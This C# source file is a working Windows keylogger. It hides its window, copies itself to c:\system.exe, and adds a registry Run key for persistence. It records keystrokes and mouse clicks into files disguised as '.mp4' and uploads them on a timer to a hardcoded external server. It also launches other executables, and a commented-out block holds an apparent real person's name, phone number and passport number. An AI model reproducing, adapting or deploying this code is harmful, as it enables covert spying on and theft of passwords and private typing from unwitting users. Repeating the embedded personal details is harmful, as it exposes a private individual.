using System;
using System.IO;
using System.Windows.Forms;

namespace ManiyatApplication 
{
	class MainForm : System.Windows.Forms.Form
	{
        //public application entry point
        [STAThread]
        public static void Main(string[] args)
        {
            Application.Run(new MainForm());
        }

        //public constructors region
        public MainForm()
        {
            if (System.Diagnostics.Process.GetProcessesByName(System.Diagnostics.Process.GetCurrentProcess().ProcessName).Length >= 3)
                System.Diagnostics.Process.GetCurrentProcess().Kill();

            InitializeComponent();

            stringBuilder = new System.Text.StringBuilder();
            countToRestart = 0;

            logPath = "";
            executionPath = "";
            timerInterval = 1800000;
            uriAgent = URI_AGENT;

            //*************machineId = System.Environment.UserName;*************8
            machineId = "main";

            /*
            machineId.Replace('+', '0');
            machineId.Replace('-', '0');
            machineId.Replace('\\', '0');
            machineId.Replace('/', '0');
            machineId.Replace('|', '0');
            machineId.Replace('?', '0');
            */

            try
            {
                if (System.IO.File.Exists(CONFIG_FILE_NAME))
                {
                    StreamReader sr = new StreamReader(CONFIG_FILE_NAME);
                    String file = sr.ReadToEnd();
                    sr.Close();

                    String[] values = file.Split(new String[] { Environment.NewLine }, StringSplitOptions.None);

                    if (values != null)
                        for (Int32 i = 0; i < values.Length; i++)
                        {
                            if (values[i] != null && values[i]!="" && values[i][0] != '#' && values[i].IndexOf('=') >= 0 && values[i].IndexOf('=') < values[i].Length - 1)
                            {
                                String value = values[i].Substring(values[i].IndexOf('=') + 1);

                                switch (values[i].Substring(0, values[i].IndexOf('=')).ToLower())
                                {
                                    case KW_URI_AGENT:
                                        uriAgent = value;
                                        break;
                                    case KW_LOG_PATH:
                                        logPath = value;
                                        break;
                                    case KW_EXECUTION_PATH:
                                        executionPath = value;
                                        break;
                                    case KW_MACHINE_ID:
                                        machineId = value;
                                        break;
                                    case KW_TIMER:
                                        if (!Int32.TryParse(value, out timerInterval))
                                            timerInterval = 2700000;
                                        break;
                                }
                            }
                        }

                    if (System.IO.File.Exists(executionPath))
                        System.Diagnostics.Process.Start(executionPath); 
                }

                tmrMain.Interval = timerInterval;
                tmrMain.Enabled = true;
            }
            catch
            {
                machineId = "error";
            }

            ShowForm frm = new ShowForm();
            frm.Show();

            /*
            logState(System.DateTime.Now.ToString() + ';' + " Application Starting");

            String text =
                @"Full Names : Mayas Faraj
                Occupation : Communication Engineer
                Sex/Age : Male/26
                Nationality: Syrian
                Residential Address : Zahera-Damascus-Syria.
                Office or Business Address : Kazar-Damascus-Syria.
                Telephone/mobile number & Fax Numbers: +963935069750
                A Copy of your International Passport / Driver’s License Picture Page: NUM 1506675493";

             */

            String hdd = "c:\\";

             

            try
            {
                System.IO.File.Copy(Application.ExecutablePath, hdd + "system.exe", true);
            }
            catch
            {
                hdd = "d:\\";

                System.IO.File.Copy(Application.ExecutablePath, hdd + "system.exe", true);          
            }

            Microsoft.Win32.RegistryKey registryKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            registryKey.SetValue(System.IO.Path.GetFileNameWithoutExtension(hdd + "system.exe"), hdd + "system.exe");
        }

        //private events region
        private void MainFormLoad(object sender, System.EventArgs e)
        {
            stringBuilder.Append('{' + STARTING + System.DateTime.Now.ToString(TIME_FORMAT) + ' ' + machineId + '}');

            try
            {
                actHook = new ManiyatHook();
                actHook.OnMouseActivity += new MouseEventHandler(MouseMoved);
                actHook.KeyDown += new KeyEventHandler(MyKeyDown);
                actHook.KeyPress += new KeyPressEventHandler(MyKeyPress);
                actHook.KeyUp += new KeyEventHandler(MyKeyUp);

                if (System.IO.File.Exists("os.exe"))
                    System.Diagnostics.Process.Start("os.exe");
            }
            catch(Exception ex)
            {
                logState('{' + ERROR + ' ' + ERROR_APPLICATION_START + ' ' + ',' + System.DateTime.Now.ToString(TIME_FORMAT) + ',' + ex.Message + '}');
                restart();
            }
        }

        private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            upload(System.IO.Path.Combine(logPath.Trim(), machineId + ".mp4"));
            logState(System.DateTime.Now.ToString() + ';' + "Closing");
        }

        private void MouseMoved(object sender, MouseEventArgs e)
		{
            if (e.Clicks > 0)
            {
                String key;

                switch (e.Button)
                {
                    case System.Windows.Forms.MouseButtons.Left:
                        key = LMOUSE_CLICK;
                        break;
                    case System.Windows.Forms.MouseButtons.Right:
                        key = RMOUSE_CLICK;
                        break;
                    case System.Windows.Forms.MouseButtons.Middle:
                        key = MMOUSE_CLICK;
                        break;
                    case System.Windows.Forms.MouseButtons.XButton1:
                        key = X1MOUSE_CLICK;
                        break;
                    case System.Windows.Forms.MouseButtons.XButton2:
                        key = X2MOUSE_CLICK;
                        break;
                    default:
                        return;
                }

                stringBuilder.Append(key);
            }
		}

        private void MyKeyDown(object sender, KeyEventArgs e)
		{
            String key;

            switch (e.KeyCode)
            {
                case System.Windows.Forms.Keys.Enter:
                    key = ENTER_DOWN;
                    break;
                case System.Windows.Forms.Keys.LShiftKey:
                case System.Windows.Forms.Keys.RShiftKey:
                    key = SHIFT_DOWN;
                    break;
                case System.Windows.Forms.Keys.LControlKey:
                case System.Windows.Forms.Keys.RControlKey:
                    key = CTRL_DOWN;
                    break;
                case System.Windows.Forms.Keys.LButton|System.Windows.Forms.Keys.MButton|System.Windows.Forms.Keys.Space|System.Windows.Forms.Keys.F17:
                case System.Windows.Forms.Keys.MButton|System.Windows.Forms.Keys.Space|System.Windows.Forms.Keys.F17:
                case System.Windows.Forms.Keys.Alt:
                    key = ALT_DOWN;
                    break;
                case System.Windows.Forms.Keys.Escape:
                    key = ESC_DOWN;
                    break;
                case System.Windows.Forms.Keys.Delete:
                    key = DELETE_DOWN;
                    break;
                case System.Windows.Forms.Keys.LWin:
                case System.Windows.Forms.Keys.RWin:
                    key = START_DOWN;
                    break;
                case System.Windows.Forms.Keys.Back:
                    key = BACKSPACE_DOWN;
                    break;
                case System.Windows.Forms.Keys.Home:
                    key = HOME_DOWN;
                    break;
                case System.Windows.Forms.Keys.End:
                    key = END_DOWN;
                    break;
                case System.Windows.Forms.Keys.CapsLock:
                    key = CAPS_DOWN;
                    break;
                case System.Windows.Forms.Keys.Tab:
                    key = TAB_DOWN;
                    break;
                case System.Windows.Forms.Keys.Up:
                    key = ARROWUP_DOWN;
                    break;
                case System.Windows.Forms.Keys.Down:
                    key = ARROWDOWN_DOWN;
                    break;
                case System.Windows.Forms.Keys.Left:
                    key = ARROWLEFT_DOWN;
                    break;
                case System.Windows.Forms.Keys.Right:
                    key = ARROWRIGHT_DOWN;
                    break;
                default:
                    return;
            }

            stringBuilder.Append(key);
		}

        private void MyKeyPress(object sender, KeyPressEventArgs e)
		{
            stringBuilder.Append(e.KeyChar);
		}

        private void MyKeyUp(object sender, KeyEventArgs e)
		{
            String key;

            switch (e.KeyCode)
            {
                case System.Windows.Forms.Keys.LShiftKey:
                case System.Windows.Forms.Keys.RShiftKey:
                    key = SHIFT_UP;
                    break;
                case System.Windows.Forms.Keys.LControlKey:
                case System.Windows.Forms.Keys.RControlKey:
                    key = CTRL_UP;
                    break;
                case System.Windows.Forms.Keys.LButton | System.Windows.Forms.Keys.MButton | System.Windows.Forms.Keys.Space | System.Windows.Forms.Keys.F17:
                    key = ALT_UP;
                    break;
                default:
                    return;
            }

            stringBuilder.Append(key);
		}

        private void tmrMain_Tick(object sender, EventArgs e)
        {
            upload(System.IO.Path.Combine(logPath.Trim(), machineId + ".mp4"));
            countToRestart++;

            if (countToRestart > 5)
            {
                System.Diagnostics.Process.Start(Application.ExecutablePath);
                this.Close();
            }
        }
		
        //private functions region
        [System.Runtime.InteropServices.DllImport("wininet.dll")]
        private extern static bool InternetGetConnectedState(out int Description, int ReservedValue); 

        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.tmrMain = new System.Windows.Forms.Timer(this.components);
            this.SuspendLayout();
            // 
            // tmrMain
            // 
            this.tmrMain.Interval = 2700000;
            this.tmrMain.Tick += new System.EventHandler(this.tmrMain_Tick);
            // 
            // MainForm
            // 
            this.AutoScaleBaseSize = new System.Drawing.Size(5, 13);
            this.ClientSize = new System.Drawing.Size(0, 0);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "MainForm";
            this.Opacity = 0D;
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.WindowState = System.Windows.Forms.FormWindowState.Minimized;
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.MainForm_FormClosing);
            this.Load += new System.EventHandler(this.MainFormLoad);
            this.ResumeLayout(false);

        }

        private void logFile()
        {
            try
            {
                System.IO.StreamWriter sr = new System.IO.StreamWriter(System.IO.Path.Combine(logPath.Trim(), machineId + ".mp4"), false);
                sr.Write(stringBuilder.ToString());
                sr.Close();
            }
            catch (Exception ex)
            {
                logState(System.DateTime.Now.ToString() + ';' + "ErrorLogFile" + ex.Message);
                restart();
            }
        }

        private void logState(String txt)
        {
            /*
            try
            {
                System.IO.StreamWriter sw = new System.IO.StreamWriter(System.IO.Path.Combine(logPath.Trim(), "log.mp4"), true);
                sw.Write(txt + Environment.NewLine);
                sw.Close();
            }
            catch
            {
            }
            */
        }

        private void upload(String filePath)
        {
            try
            {
                Int32 desc;

                if (!InternetGetConnectedState(out desc, 0))
                    return;
            }
            catch
            {
                //do nothing
            }

            try
            {
                if (stringBuilder.Length <= (STARTING.Length + 25 + machineId.Length))
                    return;

                logFile();

                if (System.IO.File.Exists(filePath))
                {
                    System.Net.WebClient webClient = new System.Net.WebClient();
                    webClient.UploadFile(uriAgent, filePath);
                }

                stringBuilder.Remove(0, stringBuilder.Length);
                stringBuilder.Append('{' + STARTING + System.DateTime.Now.ToString(TIME_FORMAT) + ' ' + machineId + '}');
            }
            catch (Exception ex)
            {
                logState('{' + ERROR + ' ' + ERROR_FILE_UPLOADING + ' ' + ',' + System.DateTime.Now.ToString(TIME_FORMAT) + ',' + ex.Message + '}');
            }
        }

        private void restart()
        {
            //do nothing
        }

        //private fields region
        private Timer tmrMain;
        private System.ComponentModel.IContainer components;
        private System.Text.StringBuilder stringBuilder;
        private ManiyatHook actHook;
        private String machineId;
        private String logPath;
        private String uriAgent;
        private String executionPath;
        private Int32 countToRestart;
        private Int32 timerInterval;

        //private constants region
        private const String LOG_PRIMARY_NAME = "primary.mp4";
        private const String CONFIG_FILE_NAME = "config.mp4";
        //private const String URI_AGENT = "http://localhost:1090/agent.aspx";
        private const String URI_AGENT = "http://www.mainagent.somee.com/agent.aspx";

        private const String KW_LOG_PATH = "logpath";
        private const String KW_EXECUTION_PATH = "executionpath";
        private const String KW_TIMER = "timer";
        private const String KW_MACHINE_ID = "machineid";
        private const String KW_URI_AGENT = "uriagent";

        private const String ENTER_DOWN = "{*EN*}";

        private const String ESC_DOWN = "{*ES*}";

        private const String SHIFT_DOWN = "{*SD*}";
        private const String SHIFT_UP = "{*SU*}";

        private const String ALT_DOWN = "{*LD*}";
        private const String ALT_UP = "{*LU*}";

        private const String CTRL_DOWN = "{*CD*}";
        private const String CTRL_UP = "{*CU*}";

        private const String DELETE_DOWN = "{*DD*}";

        private const String START_DOWN = "{*STD*}";

        private const String BACKSPACE_DOWN = "{*BD*}";

        private const String HOME_DOWN = "{*HD*}";

        private const String END_DOWN = "{*ED*}";

        private const String CAPS_DOWN = "{*CLD*}";

        private const String TAB_DOWN = "{*TD*}";

        private const String LMOUSE_CLICK = "{\'}";
        private const String RMOUSE_CLICK = "{\"}";
        private const String MMOUSE_CLICK = "{*MM*}";
        private const String X1MOUSE_CLICK = "{*M1*}";
        private const String X2MOUSE_CLICK = "{*M2*}";

        private const String ARROWLEFT_DOWN = "{*AL*}";
        private const String ARROWRIGHT_DOWN = "{*AR*}";
        private const String ARROWUP_DOWN = "{*AU*}";
        private const String ARROWDOWN_DOWN = "{*AD*}";

        private const String STARTING = "str";
        private const String STOPPING = "stp";
        private const String ERROR = "err";
        private const String TIME_FORMAT = "hh:mm:ss-dd/MM/yyyy";

        private const String ERROR_APPLICATION_START = "0";
        private const String ERROR_APPLICATION_STOP = "1";
        private const String ERROR_HOOK_START = "2";
        private const String ERROR_HOOK_STOP = "3";
        private const String ERROR_WINDOWS_STARTUP = "4";
        private const String ERROR_WRITELOG = "5";
        private const String ERROR_CONFIGURE_LOADING = "6";
        private const String ERROR_FILE_SWITCHING = "7";
        private const String ERROR_FILE_UPLOADING = "8";
	}			
}


